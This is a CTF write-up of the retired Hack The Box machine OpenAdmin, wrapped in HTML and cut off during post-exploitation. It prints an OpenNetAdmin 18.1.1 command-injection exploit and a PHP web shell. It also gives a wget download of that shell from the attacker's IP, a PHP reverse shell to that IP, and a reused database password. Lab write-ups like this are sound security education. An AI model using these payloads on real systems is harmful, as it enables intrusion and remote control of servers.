@@ -1,0 +1,341 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="DezeStijn"><meta name=description content="Write-up of the OpenAdmin machine by dmw0ngon on HackTheBox.eu."><meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,dmw0ng,Machine,OpenAdmin"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://sequr.be/blog/2020/05/openadmin/><title>Openadmin :: Sequr
+</title><link rel=stylesheet href=https://sequr.be/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css integrity="sha256-JEGDzeGjjgsI+CwReRGBKI+arBzJYYzW9OnncQxXaLo=" crossorigin=anonymous><link rel=stylesheet type=text/css href=https://sequr.be/css/table.css><link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css><link rel=stylesheet type=text/css href=https://sequr.be/css/background.css><link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png><link rel=manifest href=https://sequr.be/site.webmanifest><link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://sequr.be/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Openadmin"><meta itemprop=description content="Write-up of the OpenAdmin machine by dmw0ngon on HackTheBox.eu."><meta itemprop=datePublished content="2020-05-04T18:53:20+02:00"><meta itemprop=dateModified content="2020-05-04T18:53:20+02:00"><meta itemprop=wordCount content="1857"><meta itemprop=image content="https://sequr.be/img/htb-openadmin.png"><meta itemprop=keywords content="HackTheBox.eu,Dmw0ng,Machine,OpenAdmin"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sequr.be/img/htb-openadmin.png"><meta name=twitter:title content="Openadmin"><meta name=twitter:description content="Write-up of the OpenAdmin machine by dmw0ngon on HackTheBox.eu."><meta property="article:section" content="Hack The Box"><meta property="article:section" content="Writeup"><meta property="article:published_time" content="2020-05-04 18:53:20 +0200 CEST"><link rel=webmention href=https://webmention.io/sequr.be/webmention></head><body><div class=container><header class=header><span class=header__inner><a href=https://sequr.be/ style=text-decoration:none><div class=logo><span class=logo__mark>$</span>
+<span class=logo__text>lynx sequr.be</span>
+<span class=logo__cursor style=background-color:#e68101></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class="post h-entry"><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+9 minutes</p></div><article><h1 class="post-title p-name"><a href=https://sequr.be/blog/2020/05/openadmin/ class=u-url>Openadmin</a></h1><hr><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents><ul><li><a href=#machine-info>Machine info</a></li><li><a href=#recon>Recon</a><ul><li><a href=#nmap>Nmap</a></li><li><a href=#dirb>Dirb</a></li><li><a href=#ona>ONA</a></li></ul></li><li><a href=#foothold>Foothold</a><ul><li><a href=#shell>Shell</a></li></ul></li><li><a href=#user>User</a><ul><li><a href=#continue-enumeration>Continue enumeration</a></li><li><a href=#password-reuse-jimmy>Password reuse (Jimmy)</a></li><li><a href=#enum-enum-enum>Enum, enum, enum</a></li><li><a href=#joanna-flag>Joanna (Flag)</a></li></ul></li><li><a href=#privesc>Privesc</a></li></ul></nav></aside><hr><div class="post-content e-content"><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=machine-info>Machine info <a href=#machine-info>¶</a></h2><p>OpenAdmin [by <a href=https://www.hackthebox.eu/home/users/profile/82600 target=_blank rel=noopener>dmw0ng</a>]<br>IP: 10.10.10.171<br>OS: Linux<br>Difficulty: Easy<br>Release: 4 Jan 2020<br>Retired: 4 May 2020</p><h2 id=recon>Recon <a href=#recon>¶</a></h2><h3 id=nmap>Nmap <a href=#nmap>¶</a></h3><p>As usual we kick off with a nmap scan of the box</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$  nmap -v -A -sC -T4 -oA scanning/nmap_openadmin 10.10.10.171
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.171
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.033s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>974</span> closed ports
+</span></span><span style=display:flex><span>PORT   STATE  SERVICE    VERSION
+</span></span><span style=display:flex><span>22/tcp  open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>2048</span> 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>256</span> dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_ <span style=color:#ae81ff>256</span> dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp  open   http     Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_ Supported Methods: OPTIONS HEAD GET POST
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-title: <span style=color:#e6db74>&#34;Apache2 Ubuntu Default Page: It works&#34;</span>
+</span></span><span style=display:flex><span>90/tcp  filtered dnsix
+</span></span><span style=display:flex><span>106/tcp  filtered pop3pw
+</span></span><span style=display:flex><span>407/tcp  filtered timbuktu
+</span></span><span style=display:flex><span>500/tcp  filtered isakmp
+</span></span><span style=display:flex><span>1041/tcp filtered danf-ak2
+</span></span><span style=display:flex><span>1063/tcp filtered kyoceranetdev
+</span></span><span style=display:flex><span>1163/tcp filtered sddp
+</span></span><span style=display:flex><span>1309/tcp filtered jtag-server
+</span></span><span style=display:flex><span>1311/tcp filtered rxmon
+</span></span><span style=display:flex><span>2001/tcp filtered dc
+</span></span><span style=display:flex><span>3493/tcp filtered nut
+</span></span><span style=display:flex><span>6001/tcp filtered X11:1
+</span></span><span style=display:flex><span>6059/tcp filtered X11:59
+</span></span><span style=display:flex><span>6100/tcp filtered synchronet-db
+</span></span><span style=display:flex><span>7676/tcp filtered imqbrokerd
+</span></span><span style=display:flex><span>7920/tcp filtered unknown
+</span></span><span style=display:flex><span>8000/tcp open   http     SimpleHTTPServer 0.6 <span style=color:#f92672>(</span>Python 3.6.8<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_ Supported Methods: GET HEAD
+</span></span><span style=display:flex><span>|_http-server-header: SimpleHTTP/0.6 Python/3.6.8
+</span></span><span style=display:flex><span>|_http-title: <span style=color:#e6db74>&#34;Directory listing for /&#34;</span>
+</span></span><span style=display:flex><span>8443/tcp filtered https-alt
+</span></span><span style=display:flex><span>8994/tcp filtered unknown
+</span></span><span style=display:flex><span>9101/tcp filtered jetdirect
+</span></span><span style=display:flex><span>9575/tcp filtered unknown
+</span></span><span style=display:flex><span>9943/tcp filtered unknown
+</span></span><span style=display:flex><span>40193/tcp filtered unknown
+</span></span><span style=display:flex><span>54328/tcp filtered unknown
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>I believe the SimpleHTTPServer on port 8000 is actually from another pentester who&rsquo;s exfiltrating some stuff.</p><h3 id=dirb>Dirb <a href=#dirb>¶</a></h3><p>Let&rsquo;s run dirbuster on the website (port 80) to see if we can find any interesting folders or files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ dirb http://10.10.10.171:80/ /usr/share/dirb/wordlists/common.txt -o scanning/dirb_openadmin_p80.txt -l
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>DIRB v2.22    
+</span></span><span style=display:flex><span>By The Dark Raver
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OUTPUT_FILE: scanning/dirb_openadmin_p80.txt
+</span></span><span style=display:flex><span>START_TIME: Wed Feb <span style=color:#ae81ff>12</span> 17:14:24 <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>URL_BASE: http://10.10.10.171:80/
+</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span style=display:flex><span>OPTION: Printing LOCATION header
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GENERATED WORDS: <span style=color:#ae81ff>4612</span>                                                          
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>---- Scanning URL: http://10.10.10.171:80/ ----
+</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.10.10.171:80/artwork/
+</span></span><span style=display:flex><span>+ http://10.10.10.171:80/index.html <span style=color:#f92672>(</span>CODE:200|SIZE:10918<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.10.10.171:80/music/
+</span></span><span style=display:flex><span>+ http://10.10.10.171:80/server-status <span style=color:#f92672>(</span>CODE:403|SIZE:277<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>This gives us the <code>/artwork</code> and <code>/music</code> folders.</p><p>Looking at the different pages, we find a login button on the Solmusic website.</p><figure class=center><img src=https://sequr.be/img/htb-openadmin-music.png><figcaption class=center>Login button on Solmusic</figcaption></figure><p>This button leads us to a new website: <code>http://10.10.10.171/ona/</code></p><h3 id=ona>ONA <a href=#ona>¶</a></h3><p>ONA, which appears to stand for OpenNetAdmin, provides a database managed inventory of your IP network.</p><p>Browsing through tha application, we find that it&rsquo;s running v18.1.1, which is not the most recent version.</p><figure class=center><img src=https://sequr.be/img/htb-openadmin-ona.png><figcaption class=center>ONA v18.1.1</figcaption></figure><p>We also find a hostname, which we could add to our <code>/etc/hosts</code> file.</p><figure class=center><img src=https://sequr.be/img/htb-openadmin-dns.png><figcaption class=center>openadmin.htb</figcaption></figure><h2 id=foothold>Foothold <a href=#foothold>¶</a></h2><p>Using <code>searchsploit</code> we find some potential exploits for OpenNetAdmin.
+One of the exploits promises RCE (Remote Code Execution) on OpenNetAdmin v18.1.1. <strong>PERFECT!</strong></p><p>We download the exploit script and have a look at how it works.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ mkdir exploits
+</span></span><span style=display:flex><span>$ cd exploits
+</span></span><span style=display:flex><span>$ searchsploit -m <span style=color:#ae81ff>47691</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat 47691.sh 
+</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Date: 2019-11-19</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Author: mattpascoe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Vendor Homepage: http://opennetadmin.com/</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Software Link: https://github.com/opennetadmin/ona</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Version: v18.1.1</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Tested on: Linux</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Title: OpenNetAdmin v18.1.1 RCE</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Date: 2019-11-19</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Author: mattpascoe</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Vendor Homepage: http://opennetadmin.com/</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Software Link: https://github.com/opennetadmin/ona</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Version: v18.1.1</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Tested on: Linux</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>URL<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>1<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> true;<span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span> echo -n <span style=color:#e6db74>&#34;</span>$<span style=color:#e6db74> &#34;</span>; read cmd
+</span></span><span style=display:flex><span> curl --silent -d <span style=color:#e6db74>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span style=color:#e6db74>${</span>cmd<span style=color:#e6db74>}</span><span style=color:#e6db74>;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>URL<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> | sed -n -e <span style=color:#e6db74>&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
+</span></span></code></pre></div><p>So we can manually test the exploit, testing the <code>whoami</code> command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -d <span style=color:#e6db74>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;whoami;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> http://openadmin.htb/ona/ | sed -n -e <span style=color:#e6db74>&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
+</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>3179</span>  <span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>3049</span>  <span style=color:#ae81ff>100</span>   <span style=color:#ae81ff>130</span>  <span style=color:#ae81ff>26513</span>   <span style=color:#ae81ff>1130</span> --:--:-- --:--:-- --:--:-- <span style=color:#ae81ff>27643</span>
+</span></span><span style=display:flex><span>www-data
+</span></span></code></pre></div><p>Success!</p><h3 id=shell>Shell <a href=#shell>¶</a></h3><p>So let&rsquo;s try and get a shell on the box.</p><p>For this, we create a PHP page that&rsquo;ll allow us to execute commands on the target box.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>title</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Webshell</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>title</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>body</span> <span style=color:#a6e22e>bgcolor</span><span style=color:#f92672>=</span><span style=color:#75715e>#000000 text=#ffffff &#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>form</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#a6e22e>POST</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#a6e22e>TEXT</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-cmd&#34;</span> <span style=color:#a6e22e>size</span><span style=color:#f92672>=</span><span style=color:#ae81ff>64</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;?php echo </span><span style=color:#e6db74>$cmd</span><span style=color:#e6db74> ?&gt;&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;background:#000000;color:#ffffff;&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>hr</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>pre</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> $cmd <span style=color:#f92672>=</span> $_REQUEST[<span style=color:#e6db74>&#34;-cmd&#34;</span>];<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php if($cmd != &#34;&#34;) print Shell_Exec($cmd);?&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/pre&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/form&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
+</span></span></span></code></pre></div><p>To quickly transfer the file to the target box, we can set up a webserver on our machine and download the file on the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 -m http.server
+</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>8000</span> <span style=color:#f92672>(</span>http://0.0.0.0:8000/<span style=color:#f92672>)</span> ...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ curl -d <span style=color:#e6db74>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;wget http://10.10.14.101:8000/FlatMarsSociet.php;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> http://openadmin.htb/ona/ | sed -n -e <span style=color:#e6db74>&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
+</span></span></code></pre></div><p>Our shell is now available at <code>http://10.10.10.171/ona/FlatMarsSociet.php</code></p><p>We can use is shell to run commands, but it&rsquo;s also more intuitive to run commands in a terminal instead of a web page.<br>So let&rsquo;s provide ourselves with a reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Attacker box</span>
+</span></span><span style=display:flex><span>$ nc -lvp <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Web shell</span>
+</span></span><span style=display:flex><span>php -r <span style=color:#e6db74>&#39;$sock=fsockopen(&#34;10.10.14.101&#34;,1337);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span></code></pre></div><p>And test using <code>whoami</code> again</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ nc -vlp <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.14.101<span style=color:#f92672>]</span> from openadmin.htb <span style=color:#f92672>[</span>10.10.10.171<span style=color:#f92672>]</span> <span style=color:#ae81ff>41104</span>
+</span></span><span style=display:flex><span>/bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
+</span></span><span style=display:flex><span>$ whoami
+</span></span><span style=display:flex><span>www-data
+</span></span></code></pre></div><h2 id=user>User <a href=#user>¶</a></h2><h3 id=continue-enumeration>Continue enumeration <a href=#continue-enumeration>¶</a></h3><p>To investigate the box further, we can use <a href=https://github.com/rebootuser/LinEnum title=LinEnum target=_blank rel=noopener>LinEnum</a> to help us find interesting paths (for potential privesc).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ wget http://10.10.14.101:8000/LinEnum.sh
+</span></span><span style=display:flex><span>$ chmod u+x LinEnum.sh
+</span></span><span style=display:flex><span>$ ./LinEnum.sh | tee LinEnum.log
+</span></span></code></pre></div><p>Looking at the output, we only seem to find usernames.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Users that have previously logged onto the system:
+</span></span><span style=display:flex><span>Username         Port     From             Latest
+</span></span><span style=display:flex><span>root             tty1                      Sat Jan  <span style=color:#ae81ff>4</span> 21:23:05 +0000 <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>jimmy            pts/1    10.10.15.71      Wed Feb <span style=color:#ae81ff>12</span> 17:36:17 +0000 <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>joanna           pts/3    10.10.15.71      Wed Feb <span style=color:#ae81ff>12</span> 17:40:59 +0000 <span style=color:#ae81ff>2020</span>
+</span></span></code></pre></div><p>So let&rsquo;s look at some configuration files.<br>Since ONA uses a database, we might be able to find some db creds.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ pwd
+</span></span><span style=display:flex><span>/opt/ona/www
+</span></span><span style=display:flex><span>$ cat local/config/database_settings.inc.php
+</span></span><span style=display:flex><span>&lt;?php
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ona_contexts<span style=color:#f92672>=</span>array <span style=color:#f92672>(</span>
+</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;DEFAULT&#39;</span> <span style=color:#f92672>=</span>&gt; 
+</span></span><span style=display:flex><span>  array <span style=color:#f92672>(</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;databases&#39;</span> <span style=color:#f92672>=</span>&gt; 
+</span></span><span style=display:flex><span>    array <span style=color:#f92672>(</span>
+</span></span><span style=display:flex><span>      0 <span style=color:#f92672>=</span>&gt; 
+</span></span><span style=display:flex><span>      array <span style=color:#f92672>(</span>
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_type&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;mysqli&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_host&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;localhost&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_login&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;ona_sys&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_passwd&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;n1nj4W4rri0R!&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_database&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;ona_default&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_debug&#39;</span> <span style=color:#f92672>=</span>&gt; false,
+</span></span><span style=display:flex><span>      <span style=color:#f92672>)</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>)</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;description&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;Default data context&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;context_color&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;#D3DBFF&#39;</span>,
+</span></span><span style=display:flex><span>  <span style=color:#f92672>)</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>)</span>;
+</span></span></code></pre></div><h3 id=password-reuse-jimmy>Password reuse (Jimmy) <a href=#password-reuse-jimmy>¶</a></h3><p>Since people tend to reuse passwords, let&rsquo;s try this password in combination with the username we found.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh jimmy@10.10.10.171
+</span></span><span style=display:flex><span>jimmy@10.10.10.171<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: <span style=color:#75715e># n1nj4W4rri0R!</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.3 LTS <span style=color:#f92672>(</span>GNU/Linux 4.15.0-70-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>jimmy@openadmin:~$
+</span></span></code></pre></div><p>We now have access to Johny&rsquo;s account.</p><h3 id=enum-enum-enum>Enum, enum, enum <a href=#enum-enum-enum>¶</a></h3><p>With this new account, we&rsquo;ll enumerate some more.</p><p>We discover that there&rsquo;s an additional web server running.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jimmy@openadmin:~$ ls /var/www/
+</span></span><span style=display:flex><span>html  internal  ona
+</span></span><span style=display:flex><span>jimmy@openadmin:~$ ls /var/www/internal/
+</span></span><span style=display:flex><span>index.php  logout.php  main.ph
+</span></span></code></pre></div><p>We have index.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>   <span style=color:#a6e22e>ob_start</span>();
+</span></span><span style=display:flex><span>   <span style=color:#a6e22e>session_start</span>();
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
